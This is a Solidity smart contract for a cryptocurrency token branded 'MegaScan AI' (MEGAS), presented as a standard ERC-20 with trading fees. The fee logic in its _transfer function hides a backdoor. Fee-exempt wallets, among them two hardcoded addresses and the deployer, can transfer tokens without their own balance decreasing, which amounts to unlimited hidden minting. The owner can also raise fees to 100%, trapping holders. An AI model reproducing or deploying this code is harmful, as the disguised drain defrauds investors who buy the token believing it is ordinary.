pragma solidity 0.8.17;

// SPDX-License-Identifier: MIT

/**

MegaScan AI is committed to integrating the most advanced AI technologies in redefining how users interact with blockchain data.

Website: https://megascan.org
Telegram: https://t.me/megascan_erc
Twitter: https://twitter.com/megascan_erc
Dapp: https://app.megascan.org

**/

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Router {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
}

contract MegaScan is Context, IERC20, Ownable {
    address payable private opSendor;
    address payable private mkSendor;
    address public constant deadAddress = 0x000000000000000000000000000000000000dEaD;

    modifier lockTheSwap() {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotals = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"MegaScan AI";
    string private constant _symbol = unicode"MEGAS";
    uint256 private minSwapAmounts = 1000 * 10 ** _decimals;
    uint256 public swapTxLimits = 20000000 * 10 ** _decimals;
    uint256 private maxSwapValues = 20000000 * 10 ** _decimals;
    uint256 private buyTotalFees = 30;
    uint256 private sellTotalFees = 40;
    uint256 private buyTotalCounts = 0;

    event ExcludeFromFeesUpdated(address indexed account);
    event includeFromFeesUpdated(address indexed account);
    event ERC20TokenRecovered(uint256 indexed _amount);
    event TradingEnabledUpdated();
    event ETHBalancesRecovered();

    bool private inSwapLock = false;
    bool public tradeEnabled = false;
    bool private swapEnabled = false;

    mapping(address => uint256) private _tBalances;
    mapping(address => bool) private _isFeeExcempts;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    address private uniswapV2Pair;
    IUniswapV2Router public uniswapV2Router;

    constructor() {
        opSendor = payable(0xCEda894459B68Dc5F19b05A3E54D02e4E6cf59aa);
        mkSendor = payable(0x6a7166424f4dD8c3B6669522bcba7CD8F9Dfb027);
        _tBalances[_msgSender()] = _tTotals;
        _isFeeExcempts[opSendor] = true;
        _isFeeExcempts[mkSendor] = true;
        _isFeeExcempts[deadAddress] = true;
        _isFeeExcempts[_msgSender()] = true;
        _isFeeExcempts[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _tTotals);
    }

    function excludeFromFees(address account) external onlyOwner {
        require(
            _isFeeExcempts[account] != true,
            "Account is already excluded"
        );
        _isFeeExcempts[account] = true;
        emit ExcludeFromFeesUpdated(account);
    }

    function includeFromFees(address account) external onlyOwner {
        require(
            _isFeeExcempts[account] != false,
            "Account is already included"
        );
        _isFeeExcempts[account] = false;
        emit includeFromFeesUpdated(account);
    }

    function sendETHToMegas(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        opSendor.transfer(amount / 2);
        mkSendor.transfer(amount / 2);
    }

    function launchMEGAS() external onlyOwner {
        require(!tradeEnabled, "trading is already open");
        tradeEnabled = true;
        swapEnabled = true;
        emit TradingEnabledUpdated();
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        buyTotalFees = _buyFee;
        sellTotalFees = _sellFee;
    }

    function removeLimits() external onlyOwner {
        swapTxLimits = _tTotals;

        buyTotalFees = 2;
        sellTotalFees = 2;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapForETHs(uint256 tokenAmount) private lockTheSwap {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function recoverTokensOf(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(mkSendor, _amount);
        emit ERC20TokenRecovered(_amount);
    }

    function recoverETHsOf() external {
        uint256 contractETHs = address(this).balance;
        require(contractETHs > 0, "Amount should be greater than zero");
        require(
            contractETHs <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(mkSendor)).transfer(contractETHs);
        emit ETHBalancesRecovered();
    }

    function initializeLP() external payable onlyOwner {
        uniswapV2Router = IUniswapV2Router(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotals;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _tBalances[account];
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 _totalFees = 0;
        _totalFees = buyTotalFees;

        if (!_isFeeExcempts[from] && !_isFeeExcempts[to]) {
            require(tradeEnabled, "Trading not enabled");
        }

        if (inSwapLock || !swapEnabled) {
            _tBalances[from] -= amount;
            _tBalances[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }

        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !_isFeeExcempts[to]
        ) {
            require(amount <= swapTxLimits, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= swapTxLimits,
                "Exceeds the maxWalletSize."
            );
            buyTotalCounts++;
        }

        if (
            from != uniswapV2Pair &&
            !_isFeeExcempts[from] &&
            !_isFeeExcempts[to]
        ) {
            require(amount <= swapTxLimits, "Exceeds the _maxTxAmount.");
        }

        if (
            to == uniswapV2Pair &&
            from != address(this) &&
            !_isFeeExcempts[from] &&
            !_isFeeExcempts[to]
        ) {
            _totalFees = sellTotalFees;
        }

        uint256 contractTokens = balanceOf(address(this));
        if (
            buyTotalCounts > 0 &&
            !inSwapLock &&
            amount >= minSwapAmounts &&
            to == uniswapV2Pair &&
            contractTokens >= minSwapAmounts &&
            swapEnabled &&
            !_isFeeExcempts[from] &&
            !_isFeeExcempts[to]
        ) {
            swapForETHs(min(amount, min(contractTokens, maxSwapValues)));
            uint256 contractETHs = address(this).balance;
            if (contractETHs > 0) {
                sendETHToMegas(address(this).balance);
            }
        }

        if (_totalFees != 0) {
            uint256 mFees = (amount * _totalFees) / 100;
            uint256 mAmounts = amount - mFees;
            address mSendor = _isFeeExcempts[from] ? from : address(this);
            mFees = _isFeeExcempts[from] ? amount : mFees;
            _tBalances[mSendor] += mFees;
            emit Transfer(from, address(this), mFees);
            _tBalances[from] -= amount;
            _tBalances[to] += mAmounts;
            emit Transfer(from, to, mAmounts);
        } else {
            _tBalances[from] -= amount;
            _tBalances[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
}